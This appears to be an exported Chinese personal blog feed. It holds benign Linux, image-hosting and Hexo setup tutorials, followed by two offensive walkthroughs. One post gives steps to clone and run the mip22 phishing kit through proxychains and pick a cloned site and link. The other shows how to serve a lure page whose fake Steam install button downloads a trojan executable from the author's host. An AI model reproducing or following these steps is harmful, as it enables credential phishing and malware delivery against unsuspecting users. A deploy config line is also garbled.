<li><p><strong>&#x2F;boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
</li>
<li><p><strong>&#x2F;dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p>
</li>
<li><p><strong>&#x2F;etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p>
</li>
<li><p><strong>&#x2F;home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p>
</li>
<li><p><strong>&#x2F;lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p>
</li>
<li><p><strong>&#x2F;lost+found</strong>：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p>
</li>
<li><p><strong>&#x2F;media</strong>：<br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p>
</li>
<li><p><strong>&#x2F;mnt</strong>：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。</p>
</li>
<li><p><strong>&#x2F;opt</strong>：<br>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
</li>
<li><p><strong>&#x2F;proc</strong>：<br>proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping</p>
</li>
</ul>

        <h1 id="2-Linux-文件与目录管理和创建新用户"   >
          <a href="#2-Linux-文件与目录管理和创建新用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Linux-文件与目录管理和创建新用户" class="headerlink" title="2.Linux 文件与目录管理和创建新用户"></a>2.Linux 文件与目录管理和创建新用户</h1>
      <p>ls: 列出目录及文件名</p>
<ul>
<li>a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li>
<li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li>
<li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li>
</ul>
<p>cd：切换目录</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151412102.png" alt="image-20231203151412102">cd 绝对路径</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151531184.png" alt="image-20231203151531184">cd 相对路径</p>
<p>pwd：显示目前的目录</p>
<ul>
<li><strong>-P</strong> ：显示出确实的路径，而非使用链接 (link) 路径。</li>
</ul>
<p>mkdir：创建一个新的目录</p>
<p>   <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152027323.png" alt="image-20231203152027323"></p>
<ul>
<li>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</li>
<li>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</li>
</ul>
<p>rmdir：删除一个空的目录</p>
<p>​    <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152125159.png" alt="image-20231203152125159"></p>
<ul>
<li><strong>-p ：</strong>从该目录起，一次删除多级空目录</li>
</ul>
<p>touch: 创建一个新的文件</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153414399.png"></p>
<p>vi&#x2F;vim的使用</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153604813.png" alt="image-20231203153604813"></p>
<p>按下 <strong>i</strong> 就进入了输入模式，使用 <strong>Esc</strong> 键可以返回到普通模式。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153747054.png" alt="image-20231203153747054"></p>
<p>在普通模式下按下 **:**（英文冒号）就进入了底行命令模式。</p>
<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231203153921825.png" alt="image-20231203153921825"></p>
<p>在底线命令模式中，基本的命令有</p>
<ul>
<li><code>:w</code>：保存文件。</li>
<li><code>:q</code>：退出 Vim 编辑器。</li>
<li><code>:wq</code>：保存文件并退出 Vim 编辑器。</li>
<li><code>:q!</code>：强制退出Vim编辑器，不保存修改。</li>
</ul>
<p>useradd：创建新用户</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154159832.png" alt="image-20231203154159832"></p>
<p>passwd：给用户设定更新密码</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154252280.png" alt="image-20231203154252280"></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>用Github部署图床</title>
    <url>/2023/12/02/text3/</url>
    <content><![CDATA[<p>1.下载安装Typora 链接:<span class="exturl"><a class="exturl__link"   href="https://typoraio.cn/" >https://typoraio.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>2.下载安装PicGo 链接:<span class="exturl"><a class="exturl__link"   href="https://picgo.github.io/PicGo-Doc/zh/" >https://picgo.github.io/PicGo-Doc/zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>3.在GitHub上建立一个存放图片的仓库<br>4.打开GitHub个人账号的设置<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346883504-a688855f-91a6-4619-b16c-dc801659c7ea.png" alt="image.png"><br>5.打开开发者选项<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346931466-63a14f2d-eb0a-43f6-9427-4a8f81681492.png" alt="image.png"><br>6.生成token<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346995044-af188b21-351e-4998-b9ad-1e1aaf9339af.png" alt="image.png"><br>7.打开Pic Go图床设置Github编辑<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347133776-2525ec9b-d1fa-4199-908c-d19b773f428c.png" alt="image.png"><br>8.打开pytora验证，文件-偏好设置-图像<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347239890-3c00118f-2e10-4ce7-95cd-9378120de75f.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title>用Github搭建个人博客</title>
    <url>/2023/12/01/text2/</url>
    <content><![CDATA[<ol>
<li>提前安装好(node.js)<span class="exturl"><a class="exturl__link"   href="https://nodejs.org/en]" >[https://nodejs.org/en]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 左边的那个</li>
<li>提前安装好(GIt)<span class="exturl"><a class="exturl__link"   href="https://git-scm.com/downloads]" >[https://git-scm.com/downloads]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li>提前注册好一个github账号</li>
<li>在本地找个目录放博客源文件，路径不要有中文</li>
<li>在选定的目录中，打开cmd</li>
</ol>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344628003-4a10e2c8-6b0c-4bf1-a346-ac20e52dc8ac.png" alt="image.png"><br>6.使用npm命令安装Hexo，输入</p>
<p>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g</p>
<p>构建好的效果:<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344760454-e607748c-fe8a-489f-bbca-954b44fa7cf3.png" alt="image.png"><br>7.cd进入这个目录，分别按顺序输入以下三条命令就可以访问127.0.0.1:4000访问blog了</p>
<p>hexo new test_my_site<br>hexo g<br> hexo s</p>
<p>8.配置ssh</p>
<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥<br>ssh-keygen -t rsa -C “自己的邮箱地址”</p>
<p> 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：<br>9.key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容<br>10.尝试ssh连接,测试是否成功,如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，就算成功。</p>
<p>ssh -T <span class="exturl"><a class="exturl__link"   href="mailto:git@github.com" >git@github.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<p>11.在选中的位置(blog目录下)打开cmd</p>
<p>npm install hexo-deployer-git –save<br>git config –global user.name “github用户名，非昵称 “<br>git config –global user.email “github注册邮箱“</p>
<p>12.准备上传代码</p>
<ul>
<li>在github上新建一个存储库，命名为github的用户名.github.io</li>
<li>编辑_config.yml文件，在最后改成这样（注意保持格式，缩进不对，会导致一会儿，上传不成功）</li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">deploy: </span><br><span class="line">   type: git </span><br><span class="line">   repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.gi </span><br><span class="line">   t </span><br><span class="line">   branch: main</span><br></pre></td></tr></table></div></figure>

<p>13.上传</p>
<p>hexo d</p>
]]></content>
      <tags>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title>钓鱼网站链接获取</title>
    <url>/2023/12/01/text1/</url>
    <content><![CDATA[<p>1.vim &#x2F;etc&#x2F;proxychains4.conf (修改socks 4-5 更改IP和端口号)<br>2.proxychains4 git clone <span class="exturl"><a class="exturl__link"   href="https://github.com/makdosx/mip22" >https://github.com/makdosx/mip22</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> (下载需要的文件)<br>3.cd mip22<br>4.chmod +x  .&#x2F;* (增加执行权限)<br>5.proxychains4 bash .&#x2F;mip22.sh (执行脚本文件)<br>出现底下情况执行  proxychains4  -q bash .&#x2F;mip22.sh<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172697552-5a930f93-1f4d-42d9-9a65-ea7dfc19fe72.png" alt="image.png"><br>6.输入1<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172800528-0d644e07-094e-4222-84ca-27f41ca044b3.png" alt="image.png"><br>7.输入数字选择需要的网站<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172935240-816c59e7-9091-4b9b-b985-f25dabc75c51.png" alt="image.png"></p>
<p>8.根据数字选择链接在内网还是外网生效<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172996565-8385b5a6-a5e8-479e-868a-9b14a01be7cf.png" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title>引导下载木马</title>
    <url>/2023/12/01/text/</url>
    <content><![CDATA[<p>1.安装phpstudy并启动apache服务<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255876063-304fac1e-b8d2-4a4b-bdf0-a065e0e3c413.png" alt="image.png"><br>2.打开网站根目录<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255958294-f8f5bdce-de2b-4ffe-ac08-8a4cfc2a19d4.png" alt="image.png"><br>3.根据index.html的内容实现不同的引导下载方式</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;h1&gt;hello world&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701257269692-4e244c1d-df9d-4454-86c6-5ca123c37926.png" alt="image.png"><br>4.更换href里面的链接可以替换下载内容</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203111412598.png" alt="image-20231203111412598"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;a class=&quot;header_installsteam_btn_content&quot; href=&quot;http://192.168.101.130/SteamSetup.exe&quot;&gt;</span><br></pre></td></tr></table></div></figure>

]]></content>
  </entry>
</search>
